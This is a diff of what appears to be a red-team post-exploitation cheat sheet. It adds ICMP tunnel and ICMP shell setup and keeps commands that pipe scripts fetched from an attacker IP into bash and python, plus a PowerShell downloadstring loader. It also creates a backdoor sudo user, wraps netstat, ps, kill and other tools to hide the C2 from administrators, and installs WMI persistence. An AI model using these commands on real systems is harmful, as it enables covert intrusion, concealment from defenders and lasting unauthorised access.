@@ -29,16 +29,24 @@ adduser <c2_NAME>
 usermod -aG sudo <c2_NAME>
 ssh-keygen -t rsa
 
-# post exploitation
-curl --insecure -sv https://<IP>/redghost.sh| bash -
+# proxy via icmp
+echo 1> /proc/sys/net/ipv4/icmp_echo_ignore_all 
+nohup curl --insecure -sv https://<IP>/IcmpTunnel_S.py|python - & disown
+# local icmp tunnel
+python IcmpTunnel_C.py <IP> <TARGETIP> <TARGETPORT>
+
+# icmp elf shell
 sysctl -w net.ipv4.icmp_echo_ignore_all=1
 curl --insecure https://<IP>/icmp_basic_server -o c2_icmp_basic_server && chmod +x c2_icmp_basic_server
+
+# post exploitation
+curl --insecure -sv https://<IP>/redghost.sh| bash -
 mkdir /bin/.usr/ && cd /bin/.usr/ && curl --insecure https://<IP>/bash_hide.sh -o c2_bash_hide.sh && chmod +x c2_bash_hide.sh
 
 # edit c2_bash_hide.sh
 THINGTOHIDE=c2
 
-# edit ~/.bashrc
+# edit ~/.bashrc's
 PATH=/bin/.usr/:${PATH}
 # file located in first path /bin/.usr/c2_bash_hide.sh 
 for f in "netstat" "iptables" "kill" "ps" "pgrep" "pkill" "ls" "rm" "rmdir" "passwd" "shutdown" "chmod" "sudo" "su" "cat" "useradd" "id" "ln" "unlink" "which" "gpasswd" "bash" "sh" "env" "echo" "history" "tcpdump" "chattr" "lsattr" "export" "mv" "grep" "egrep" "find"; do 
@@ -76,12 +84,13 @@ proxychains ruler --email <USER>@<TARGET> form add --suffix superduper --input /
 Survey 
 InstallWMIPersistence <EventFilterName> <EventConsumerName>
 SetFallbackNetwork <PAddress> <subnetMask>
-invoke_file /tmp/socks_proxy_server.py
+invoke_file /tmp/socks_proxy_server.ps1
+iex(new-object net.webclient).downloadstring('<URL>socks_proxy_server.ps1')
 
 # edit proxychains.conf
 socks4 <IP> <PORT>
 
-# maintaining access from icmp c2, migrate to explorer
+# maintaining access from icmp c2, migrate to explorer etc..
 InstallPersistence 1
 InstallPersistence 2
 InstallPersistence 3
